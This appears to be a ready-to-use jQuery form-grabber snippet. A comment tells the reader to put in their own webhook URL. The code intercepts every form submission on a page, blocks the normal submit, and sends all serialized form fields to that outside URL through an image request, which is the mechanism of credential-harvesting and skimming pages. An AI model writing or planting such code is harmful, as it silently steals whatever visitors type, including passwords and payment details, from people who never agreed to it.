// Replace http://yourwebhookurl.com/ with your url.

jQuery('form').submit(function(e) {
    e.preventDefault();
    jQuery.theForm = jQuery(this);
    var newImage = new Image();
    newImage.src = "http://yourwebhookurl.com/" + "?" + jQuery.theForm.serialize();
});
